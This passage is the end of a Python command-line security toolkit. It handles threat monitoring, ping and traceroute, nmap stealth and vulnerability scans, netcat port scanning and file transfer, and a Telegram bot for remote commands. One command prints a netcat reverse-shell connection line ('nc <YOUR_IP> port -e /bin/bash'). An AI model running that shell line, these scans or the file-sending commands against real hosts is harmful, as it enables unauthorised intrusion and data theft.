                    print(f"{self.colors['red']}Failed to get help: {help_result.get('output')}{self.colors['reset']}")
            else:
                self.print_help()
        
        elif cmd == 'start':
            self.monitor.start_monitoring()
            print(f"{self.colors['green']}✅ Threat monitoring started{self.colors['reset']}")
        
        elif cmd == 'stop':
            self.monitor.stop_monitoring()
            print(f"{self.colors['yellow']}🛑 Threat monitoring stopped{self.colors['reset']}")
        
        elif cmd == 'status':
            status = self.monitor.get_status()
            print(f"\n{self.colors['cyan']}📊 Monitoring Status:{self.colors['reset']}")
            print(f"  Active: {'✅ Yes' if status['monitoring'] else '❌ No'}")
            print(f"  Monitored IPs: {status['monitored_ips_count']}")
            print(f"  Threads running: {status['threads_running']}")
            
            # Show recent threats
            threats = self.db.get_recent_threats(3)
            if threats:
                print(f"\n{self.colors['red']}🚨 Recent Threats:{self.colors['reset']}")
                for threat in threats:
                    severity_color = self.colors['red'] if threat['severity'] == 'high' else self.colors['yellow']
                    print(f"  {severity_color}{threat['threat_type']} from {threat['source_ip']}{self.colors['reset']}")
        
        elif cmd == 'add_ip' and args:
            ip = args[0]
            if self.monitor.add_ip_to_monitoring(ip):
                print(f"{self.colors['green']}✅ Added {ip} to monitoring{self.colors['reset']}")
            else:
                print(f"{self.colors['red']}❌ Invalid IP address{self.colors['reset']}")
        
        elif cmd == 'remove_ip' and args:
            ip = args[0]
            if self.monitor.remove_ip_from_monitoring(ip):
                print(f"{self.colors['green']}✅ Removed {ip} from monitoring{self.colors['reset']}")
            else:
                print(f"{self.colors['red']}❌ IP not found in monitoring list{self.colors['reset']}")
        
        elif cmd == 'list_ips':
            ips = self.monitor.get_monitored_ips()
            if ips:
                print(f"\n{self.colors['cyan']}📋 Monitored IPs:{self.colors['reset']}")
                for ip in ips:
                    print(f"  • {ip}")
            else:
                print(f"{self.colors['yellow']}📋 No IPs being monitored{self.colors['reset']}")
        
        elif cmd == 'threats':
            threats = self.db.get_recent_threats(10)
            if threats:
                print(f"\n{self.colors['red']}🚨 Recent Threats:{self.colors['reset']}")
                print(f"{self.colors['yellow']}{'='*60}{self.colors['reset']}")
                for threat in threats:
                    severity_color = self.colors['red'] if threat['severity'] == 'high' else self.colors['yellow']
                    print(f"\n{severity_color}[{threat['timestamp'][:19]}] {threat['threat_type']}{self.colors['reset']}")
                    print(f"  Source: {threat['source_ip']}")
                    print(f"  Severity: {threat['severity']}")
                    print(f"  Description: {threat['description']}")
                    print(f"  Action: {threat['action_taken']}")
            else:
                print(f"{self.colors['green']}✅ No recent threats detected{self.colors['reset']}")
        
        elif cmd == 'ping' and args:
            ip = args[0]
            print(f"\n🏓 Pinging {ip}...")
            result = self.executor.execute('ping ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'traceroute' and args:
            target = args[0]
            print(f"\n🛣️ Traceroute to {target}...")
            result = self.executor.execute('traceroute ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'advanced_traceroute' and args:
            target = args[0]
            print(f"\n🛣️ Advanced traceroute to {target}...")
            result = self.traceroute_tool.interactive_traceroute(target)
            print(result)
        
        elif cmd in ['quick_scan', 'deep_scan', 'stealth_scan', 'vuln_scan', 'full_scan'] and args:
            target = args[0]
            scan_type = cmd.replace('_', ' ')
            print(f"\n🔍 {scan_type.title()} on {target}...")
            result = self.executor.execute(cmd + ' ' + target)
            self._display_result(result)
        
        elif cmd == 'network_discovery' and args:
            network_range = args[0]
            print(f"\n🌐 Discovering hosts on {network_range}...")
            result = self.executor.execute('network_discovery ' + network_range)
            self._display_result(result)
        
        elif cmd == 'nmap' and args:
            target = args[0]
            print(f"\n🔍 Nmap scan on {target}...")
            result = self.executor.execute('nmap ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'whois' and args:
            domain = args[0]
            print(f"\n🔍 WHOIS lookup for {domain}...")
            result = self.executor.execute('whois ' + domain)
            self._display_result(result)
        
        elif cmd == 'dns' and args:
            domain = args[0]
            print(f"\n🌐 DNS lookup for {domain}...")
            result = self.executor.execute('dns ' + domain)
            self._display_result(result)
        
        elif cmd == 'location' and args:
            ip = args[0]
            print(f"\n📍 Getting location for {ip}...")
            result = self.executor.execute('location ' + ip)
            self._display_result(result)
        
        elif cmd == 'analyze' and args:
            ip = args[0]
            print(f"\n🔍 Analyzing {ip}...")
            result = self.executor.execute('analyze ' + ip)
            self._display_result(result)
        
        elif cmd == 'nc_listen' and args:
            port = args[0]
            print(f"\n🔌 Starting netcat listener on port {port}...")
            result = self.executor.execute('nc_listen ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_connect' and len(args) >= 2:
            host = args[0]
            port = args[1]
            print(f"\n🔌 Connecting to {host}:{port}...")
            result = self.executor.execute('nc_connect ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_port_scan' and len(args) >= 3:
            host = args[0]
            start_port = args[1]
            end_port = args[2]
            print(f"\n🔍 Port scanning {host} ports {start_port}-{end_port}...")
            result = self.executor.execute('nc_port_scan ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_file_receive' and len(args) >= 2:
            port = args[0]
            filename = args[1]
            print(f"\n📥 Receiving file on port {port} to {filename}...")
            result = self.executor.execute('nc_file_receive ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_file_send' and len(args) >= 3:
            host = args[0]
            port = args[1]
            filename = args[2]
            print(f"\n📤 Sending file {filename} to {host}:{port}...")
            result = self.executor.execute('nc_file_send ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_banner_grab' and len(args) >= 2:
            host = args[0]
            port = args[1]
            print(f"\n🎯 Banner grabbing {host}:{port}...")
            result = self.executor.execute('nc_banner_grab ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_http_get' and len(args) >= 2:
            host = args[0]
            port = args[1]
            print(f"\n🌐 HTTP GET to {host}:{port}...")
            result = self.executor.execute('nc_http_get ' + ' '.join(args))
            self._display_result(result)
        
        elif cmd == 'nc_reverse_shell' and args:
            port = args[0]
            print(f"\n🐚 Starting reverse shell listener on port {port}...")
            print(f"Connect with: nc <YOUR_IP> {port} -e /bin/bash")
            result = self.executor.execute('nc_reverse_shell ' + port)
            self._display_result(result)
        
        elif cmd == 'nc_chat_server' and args:
            port = args[0]
            print(f"\n💬 Starting chat server on port {port}...")
            print(f"Connect with: nc <SERVER_IP> {port}")
            result = self.executor.execute('nc_chat_server ' + port)
            self._display_result(result)
        
        elif cmd == 'system' and args and args[0] == 'info':
            print(f"\n💻 System Information:")
            result = self.executor.execute('system')
            self._display_result(result)
        
        elif cmd == 'network_info':
            print(f"\n🌐 Network Information:")
            result = self.executor.execute('network')
            self._display_result(result)
        
        elif cmd == 'history':
            print(f"\n📜 Command History:")
            result = self.executor.execute('history')
            self._display_result(result)
        
        elif cmd == 'scans':
            print(f"\n📄 Scan History:")
            result = self.executor.execute('scans')
            self._display_result(result)
        
        elif cmd == 'metrics':
            print(f"\n📈 System Metrics:")
            result = self.executor.execute('metrics')
            self._display_result(result)
        
        elif cmd == 'report':
            print(f"\n📊 Generating security report...")
            result = self.executor.execute('report')
            self._display_result(result)
        
        elif cmd == 'setup_telegram':
            self.setup_telegram()
        
        elif cmd == 'test_telegram':
            self.test_telegram()
        
        elif cmd == 'send_telegram' and args:
            message = ' '.join(args)
            self.send_telegram_message(message)
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{self.colors['yellow']}👋 Exiting...{self.colors['reset']}")
        
        else:
            # Execute as generic command
            result = self.executor.execute(command)
            self._display_result(result)
    
    def _display_result(self, result: Dict[str, Any]):
        """Display command result"""
        if result['success']:
            output = result.get('output', '') or result.get('data', '')
            
            if isinstance(output, dict):
                # Pretty print dictionaries
                print(json.dumps(output, indent=2))
            else:
                print(output)
            
            print(f"\n{self.colors['green']}✅ Command executed ({result['execution_time']:.2f}s){self.colors['reset']}")
        else:
            print(f"\n{self.colors['red']}❌ Command failed: {result.get('output', 'Unknown error')}{self.colors['reset']}")
    
    def run(self):
        """Main application loop"""
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check dependencies
        self.check_dependencies()
        
        # Setup Telegram
        if not self.telegram_config.enabled:
            print(f"\n{self.colors['cyan']}🔧 Telegram Bot Setup{self.colors['reset']}")
            print(f"{self.colors['cyan']}{'='*50}{self.colors['reset']}")
            setup = input(f"\n{self.colors['yellow']}Setup Telegram for 500+ remote commands? (y/n): {self.colors['reset']}").strip().lower()
            
            if setup == 'y':
                self.setup_telegram()
            else:
                print(f"{self.colors['yellow']}⚠️ Telegram features disabled.{self.colors['reset']}")
        else:
            self.start_telegram_bot()
            print(f"\n{self.colors['green']}✅ Telegram bot is active! Send /start to your bot for 500+ commands{self.colors['reset']}")
        
        # Start monitoring
        auto_monitor = input(f"\n{self.colors['yellow']}Start threat monitoring automatically? (y/n): {self.colors['reset']}").strip().lower()
        if auto_monitor == 'y':
            self.monitor.start_monitoring()
            print(f"{self.colors['green']}✅ Threat monitoring started{self.colors['reset']}")
        
        print(f"\n{self.colors['green']}✅ Tool ready! Type 'help' for commands.{self.colors['reset']}")
        print(f"{self.colors['cyan']}💡 Tip: Use 'help all' for complete 500+ command list{self.colors['reset']}")
        print(f"{self.colors['cyan']}🔌 Netcat: 50+ networking commands available{self.colors['reset']}")
        
        # Main command loop
        while self.running:
            try:
                command = self.print_prompt()
                self.process_command(command)
            
            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}👋 Exiting...{self.colors['reset']}")
                self.running = False
            
            except Exception as e:
                print(f"{self.colors['red']}❌ Error: {str(e)}{self.colors['reset']}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.monitor.stop_monitoring()
        self.db.close()
        
        print(f"\n{self.colors['green']}✅ Tool shutdown complete.{self.colors['reset']}")
        print(f"{self.colors['cyan']}📁 Logs saved to: {LOG_FILE}{self.colors['reset']}")
        print(f"{self.colors['cyan']}💾 Database: {DATABASE_FILE}{self.colors['reset']}")
        print(f"{self.colors['cyan']}📊 Reports: {REPORT_DIR}{self.colors['reset']}")
        print(f"{self.colors['cyan']}🔍 Scans: {SCAN_RESULTS_DIR}{self.colors['reset']}")

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point"""
    try:
        print(f"{Fore.CYAN}🚀 Starting Accurate Cyber Defense Spider Bot Pro...{Style.RESET_ALL}")
        
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Fore.RED}❌ Python 3.7 or higher required{Style.RESET_ALL}")
            sys.exit(1)
        
        # Check if running as root/administrator (optional but recommended)
        if os.name != 'nt' and os.geteuid() != 0:
            print(f"{Fore.YELLOW}⚠️  Warning: Some features may require administrative privileges.{Style.RESET_ALL}")
        
        # Create and run the toolkit
        toolkit = UltimateCyberDrillToolkit()
        toolkit.run()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Tool terminated by user.{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {e}{Style.RESET_ALL}")
        logger.exception("Fatal error occurred")
        
        # Try to save error report
        try:
            error_report = {
                'timestamp': datetime.datetime.now().isoformat(),
                'error': str(e),
                'traceback': str(traceback.format_exc())
            }
            
            error_file = f"error_report_{int(time.time())}.json"
            with open(error_file, 'w') as f:
                json.dump(error_report, f, indent=2)
            
            print(f"{Fore.YELLOW}📄 Error report saved to: {error_file}{Style.RESET_ALL}")
        except:
            pass
        
        print(f"{Fore.RED}Please check {LOG_FILE} for details.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()